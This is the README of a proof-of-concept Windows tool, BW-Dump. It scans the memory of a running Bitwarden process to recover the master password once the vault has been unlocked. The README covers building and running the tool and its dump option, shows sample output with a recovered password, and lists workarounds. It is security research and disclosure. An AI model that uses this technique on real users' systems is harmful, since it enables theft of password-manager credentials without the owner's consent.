# BW-Dump

A proof-of-concept tool that extracts the master password from a locked Bitwarden vault (must be unlocked at least once) from Windows systems.

## Update (24/02/23)

![bitwarden-desktop-password-recovery-latest](https://user-images.githubusercontent.com/9108334/221217481-80bd8e11-95d5-45d7-8ad3-15cb12e7e53f.png)

Fixed a major issue with search pattern. A new and improved regular expression has been implemented. This helps identify strings that could potentially be the master password, or at least parts of it. Added a `-v` verbose option, which shows all strings that match the regex pattern. The tool has been tested and confirmed working on the latest version of Bitwarden Desktop (2023.2.0) on Windows 10 and 11.

Example output:

```
[+] Searching for processes...
[+] PID: 5468
[+] EXEName: Bitwarden.exe
[+] CMDLine: "C:\Users\Tester\AppData\Local\Programs\Bitwarden\Bitwarden.exe" --type=renderer --user-data-dir="C:\Users\Tester\AppData\Roaming\Bitwarden" --app-path="C:\Users\Tester\AppData\Local\Programs\Bitwarden\resources\app.asar" --no-sandbox --no-zygote --first-renderer-process --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1677156036809828 --launch-time-ticks=36228907657 --mojo-platform-channel-handle=2540 --field-trial-handle=1816,i,6300308413610308636,7516158819106443187,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:1
[+] Searching PID memory (5468)
[+] Found initial pattern
[+] Memory region: 0x35d40040c000 - 0x35d400434000
[+] Region size: 0x28000
[+] No. of hits: 40

all and (min-width: 241px)and (max-width: 480px)
all and (min-width: 481px)and (max-width: 768px)P
cdk-virtual-scroll-orientation-horizontal5
cdk-virtual-scroll-orientation-vertical
c55b7254_0a77_4262_ae9b_23e2a1943d05
attribution-reporting
...
ALL those flying cats
...
cdk-high-contrast-active
http://www.w3.org/2000/svg-pristine
all and (max-width: 240px)
cdk-overlay-containergling
axbufferpx
Zone:defineProperty
truncate-box
truncate
detaill-scroll-item
Zone:FileReader
lg tw-text-muted
[+] ------- Complete ---------
[+] ALL those fl!
[+] ALL those flying c
[+] ALL those flying cat
```

## Update (21/09/22)
A recent security update (not sure which one exactly) has fixed the issue on the web browser extension. ~~However, on versions `v2022.6.0` and below it should still work.~~ No longer supported.

## Demo
A short demo of using bw-dump with Microsoft Edge and the Bitwarden browser extension.

https://user-images.githubusercontent.com/9108334/191377244-f0e9a123-e4f0-43b0-90b5-697fc005ae7b.mov

## Building
**Warning: Windows Defender may report the compiled binary as malicious!**

To build on a system other than Windows:
```bash
env GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

Otherwise, run `go build -ldflags="-s -w"` which builds a stripped binary.

## Running
Simply build and execute the binary. It does NOT require admin rights. Make sure, a Chromium browser is running and the Bitwarden extension is installed. In addition, the vault needs to be unlocked at least once. After which, the master password will be stored in memory for a period of time. 

You can also pass the `-d` option to dump memory regions when a pattern is found. For each result, a filename `dump-pid-<PID>-<MEM-REGION>.hex` is created in the current working directory.

**Example Output**
```bash
PS C:\Users\Tester\dev\go\bw-dump> bw-dump.exe

 888 88b, Y8b Y8b Y888P    888 88e
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888     
    
BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults
(must be unlocked at least once) by reading process memory using Windows API functions which
searches for magic byte patterns. The tool doesn't require any special (admin) permissions.

Now supports Bitwarden Desktop App (v2023.1.1) running on Windows 10 or 11. The tool (may) 
still support older Bitwarden Chromium extension versions (v2022.6.0) and below.

[+] Searching for processes...
[+] PID: 4228
[+] EXEName: Bitwarden.exe
[+] CMDLine: "C:\Users\Tester\AppData\Local\Programs\Bitwarden\Bitwarden.exe" --type=renderer --user-data-dir="C:\Users\Tester\AppData\Roaming\Bitwarden" --app-path="C:\Users\Tester\AppData\Local\Programs\Bitwarden\resources\app.asar" --no-sandbox --no-zygote --first-renderer-process --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1675782335888921 --launch-time-ticks=4007177473 --mojo-platform-channel-handle=2508 --field-trial-handle=1792,i,3673052334935287551,6849534636950916074,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:1

[+] Searching PID memory (4228)
[+] Found pattern at MemBaseAddr (0xb0800554000)
[+] Found password prefix bytes at offset (0xc121)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb0800a8c000)
[+] Found password prefix bytes at offset (0x1104)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb08014bc000)
[+] Found password prefix bytes at offset (0x62aa)
[+] Password recovered: "SUPER-SECURE-password8"

PS C:\Users\Tester\dev\go\bw-dump> 
```

## Is there a solution or workaround?
There are two ways (probably more) the master password can be trashed from memory:
1. Once locked, enter any random WRONG password. This should replace your password stored in memory.
2. Terminate the `Bitwarden.exe` process which Windows should do some garbage collection.

## What's next?
- Create a Volaility3 plugin that can extract master passwords from saved memory dumps.
